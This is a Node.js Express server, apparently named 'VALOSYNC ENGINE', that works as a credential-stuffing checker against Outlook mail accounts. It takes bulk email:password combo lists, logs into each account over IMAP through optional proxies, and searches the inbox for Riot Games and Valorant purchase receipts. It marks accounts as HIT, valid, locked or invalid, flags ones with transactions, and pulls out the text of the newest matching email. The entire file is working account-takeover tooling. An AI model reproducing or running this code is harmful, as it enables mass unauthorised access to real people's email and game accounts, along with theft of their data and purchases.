const express = require('express');
const { ImapFlow } = require('imapflow');
const { simpleParser } = require('mailparser');
const { HttpsProxyAgent } = require('https-proxy-agent');
const app = express();

// Middleware: Support JSON besar (untuk list combo ribuan baris)
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

/**
 * CORE CHECKER FUNCTION
 */
async function checkMail(email, password, proxyStr) {
    let agent = null;
    
    // Validasi dan Inisialisasi Proxy
    if (proxyStr && proxyStr.trim().length > 10) {
        try {
            const cleanProxy = proxyStr.trim();
            agent = new HttpsProxyAgent(cleanProxy);
        } catch (e) {
            console.log(`[!] Invalid Proxy: ${proxyStr.substring(0, 30)}...`);
        }
    }

    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false,
        greetingTimeout: 20000, // Timeout lebih lama untuk proxy lambat
        connectionTimeout: 30000,
        ...(agent && { tls: { agent: agent } })
    });

    try {
        await client.connect();
        
        // Jika sampai sini, berarti Login BERHASIL (VALID)
        let lock = await client.getMailboxLock('INBOX');
        let result = { 
            status: 'VALID_ONLY', 
            count: 0, 
            isSultan: false, 
            body: "Email is Live, but no Riot Games data found." 
        };

        try {
            // Pencarian Spesifik: Riot, Valorant, atau Bukti Pembelian
            let messages = await client.search({
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' },
                    { body: 'Purchase Receipt' },
                    { body: 'Order Confirmed' }
                ]
            });

            if (messages.length > 0) {
                // Jika ditemukan, status berubah menjadi HIT
                result.status = 'HIT';
                result.count = messages.length;
                
                // Ambil 1 email terbaru untuk preview
                let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
                let parsed = await simpleParser(lastMsg.source);
                
                result.body = parsed.text || "No readable text content.";
                // Deteksi Sultan: Cek kata kunci transaksi/pembelian
                result.isSultan = /Purchase|Order|Receipt|Success|Payment|VP|Transaction/i.test(result.body);
            }
        } finally {
            lock.release();
        }

        await client.logout();
        return result;

    } catch (err) {
        const msg = err.message.toLowerCase();
        // Deteksi Akun Terkunci / AUP
        if (msg.includes('aup') || msg.includes('locked') || msg.includes('challenge') || msg.includes('denied')) {
            return { status: 'LOCKED' };
        }
        // Sisanya dianggap Invalid (Salah Pass/Email Mati)
        return { status: 'INVALID' };
    }
}

/**
 * API ENDPOINT
 */
app.post('/api/check', async (req, res) => {
    const { combo, proxy } = req.body;
    
    if (!combo || !combo.includes(':')) {
        return res.json({ status: 'INVALID' });
    }

    const [email, pass] = combo.split(':');
    
    try {
        const data = await checkMail(email.trim(), pass.trim(), proxy);
        res.json({ ...data, combo });
    } catch (e) {
        res.json({ status: 'INVALID', combo });
    }
});

/**
 * SERVER START
 */
const PORT = process.env.PORT || 7860;
app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`VALOSYNC ENGINE v2.1 ACTIVE`);
    console.log(`Port: ${PORT}`);
    console.log(`Status: Ready for High-Speed Checking`);
    console.log(`========================================`);
});
